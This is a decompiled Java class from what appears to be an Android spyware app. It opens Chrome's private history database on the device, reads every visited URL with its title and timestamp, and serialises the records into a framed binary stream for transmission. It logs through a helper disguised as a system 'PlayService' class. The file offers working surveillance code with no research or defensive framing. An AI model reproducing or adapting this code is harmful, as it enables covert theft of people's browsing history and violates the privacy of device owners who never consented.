package ru.dtlbox.databasereader;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.android.location.PlayService;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;

public class ChromeHistoryReader
  extends BaseBrowserHistoryReader
{
  private static final byte BROWSERHISTORY = 114;
  private static final long CHROME_OFFSET = 11644473600L;
  private static final String[] CURRENT_COLUMNS = { "id", "title", "url", "last_visit_time" };
  private static final String CURRENT_TABLE = "urls";
  private static final int INDEX_OF_ID = 0;
  private static final int INDEX_OF_LAST_VISIT_TIME = 3;
  private static final int INDEX_OF_TITLE = 1;
  private static final int INDEX_OF_URL = 2;
  private static final String SOURCE_DB = "/data/data/com.android.chrome/app_chrome/Default/History";
  private static final String USING_DB_NAME = "chrome.sqlite";
  
  public ChromeHistoryReader(Config paramConfig)
  {
    init(paramConfig, "/data/data/com.android.chrome/app_chrome/Default/History", "chrome.sqlite");
  }
  
  public static byte[] byteArrayFromLong(long paramLong)
  {
    ByteBuffer localByteBuffer = ByteBuffer.allocate(8);
    localByteBuffer.putLong(paramLong);
    return localByteBuffer.array();
  }
  
  private long createTimeStamp(long paramLong)
  {
    return paramLong / 1000000L - 11644473600L;
  }
  
  public static long getLong(byte[] paramArrayOfByte, int paramInt)
  {
    return (paramArrayOfByte[paramInt] & 0xFF) << 56 | (paramArrayOfByte[(paramInt + 1)] & 0xFF) << 48 | (paramArrayOfByte[(paramInt + 2)] & 0xFF) << 40 | (paramArrayOfByte[(paramInt + 3)] & 0xFF) << 32 | (paramArrayOfByte[(paramInt + 4)] & 0xFF) << 24 | (paramArrayOfByte[(paramInt + 5)] & 0xFF) << 16 | (paramArrayOfByte[(paramInt + 6)] & 0xFF) << 8 | paramArrayOfByte[(paramInt + 7)] & 0xFF;
  }
  
  void FLOG(String paramString)
  {
    PlayService.FLOG(paramString);
  }
  
  public void logIt()
  {
    FLOG(String.valueOf(System.currentTimeMillis()));
    int i = 0;
    this.mDataBaseHelper.opendatabase();
    Cursor localCursor = this.mDataBaseHelper.getDataBase().query("urls", CURRENT_COLUMNS, "id > " + String.valueOf(0), null, null, null, null);
    for (;;)
    {
      if ((!localCursor.moveToNext()) || (i >= this.count))
      {
        this.mDataBaseHelper.close();
        return;
      }
      i += 1;
      localCursor.getInt(0);
      long l = localCursor.getLong(3);
      FLOG(createTimeStamp(l));
      FLOG(localCursor.getString(1));
      FLOG(localCursor.getString(2));
    }
  }
  
  public void lookAtTable()
  {
    this.mDataBaseHelper.opendatabase();
    Object localObject = this.mDataBaseHelper.getDataBase();
    String[] arrayOfString = ((SQLiteDatabase)localObject).query("urls", null, null, null, null, null, null).getColumnNames();
    localObject = ((SQLiteDatabase)localObject).query("urls", arrayOfString, null, null, null, null, null, null);
    int i = 0;
    FLOG(String.valueOf(((Cursor)localObject).getCount()));
    if (!((Cursor)localObject).moveToNext())
    {
      this.mDataBaseHelper.close();
      return;
    }
    StringBuilder localStringBuilder = new StringBuilder();
    int j = 0;
    for (;;)
    {
      if (j >= arrayOfString.length)
      {
        FLOG(localStringBuilder.toString());
        i += 1;
        break;
      }
      try
      {
        localStringBuilder.append("| " + arrayOfString[j] + " : " + ((Cursor)localObject).getString(j) + " ");
        j += 1;
      }
      catch (Exception localException1)
      {
        for (;;)
        {
          try
          {
            localStringBuilder.append("| " + arrayOfString[j] + " : " + new String(((Cursor)localObject).getBlob(j)) + " ");
          }
          catch (Exception localException2) {}
        }
      }
    }
  }
  
  public int read(OutputStream paramOutputStream, int paramInt)
    throws IOException
  {
    int j = 0;
    this.mDataBaseHelper.opendatabase();
    int i = paramInt;
    Cursor localCursor = this.mDataBaseHelper.getDataBase().query("urls", CURRENT_COLUMNS, "id > " + String.valueOf(paramInt), null, null, null, null);
    if (localCursor.getCount() == 0) {
      return paramInt;
    }
    paramOutputStream.write(114);
    paramInt = j;
    for (;;)
    {
      if ((!localCursor.moveToNext()) || (paramInt >= this.count))
      {
        paramOutputStream.write(2);
        this.mDataBaseHelper.close();
        return i;
      }
      i = localCursor.getInt(0);
      addData(paramOutputStream, String.valueOf(createTimeStamp(localCursor.getLong(3))));
      addData(paramOutputStream, localCursor.getString(1));
      addData(paramOutputStream, localCursor.getString(2));
      paramOutputStream.write(3);
      paramInt += 1;
    }
  }
}
